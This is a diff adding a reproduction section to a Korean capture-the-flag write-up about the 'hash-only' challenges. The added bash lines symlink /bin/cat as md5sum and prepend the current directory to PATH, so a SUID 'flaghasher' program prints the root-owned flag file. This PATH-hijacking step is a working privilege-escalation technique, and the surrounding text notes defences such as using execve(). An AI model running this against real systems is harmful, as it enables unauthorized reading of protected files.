@@ -60,6 +60,18 @@ Computing the MD5 hash of /root/flag.txt....
 - `hash-only-1`: `PATH`만 조작하면 됨
 - `hash-only-2`: `rbash` 때문에 직접 경로 실행이 막혀 있어, **셸 제한을 우회하고 나서** 같은 PATH hijacking을 적용해야 함
 
+## 재현 절차
+1. `rbash`에서 허용되는 동작으로 래퍼를 준비합니다.
+2. `md5sum` 대체 파일을 만들고 PATH를 조작합니다.
+3. `flaghasher` 실행 시 실제 flag가 출력되는지 확인합니다.
+
+```bash
+# restricted shell에서 가능한 우회 준비 예시입니다.
+ln -s /bin/cat md5sum
+export PATH=".:$PATH"
+flaghasher
+```
+
 ## 7. 방어 관점 메모
 
 - `system()` 대신 `execve()`를 사용합니다.
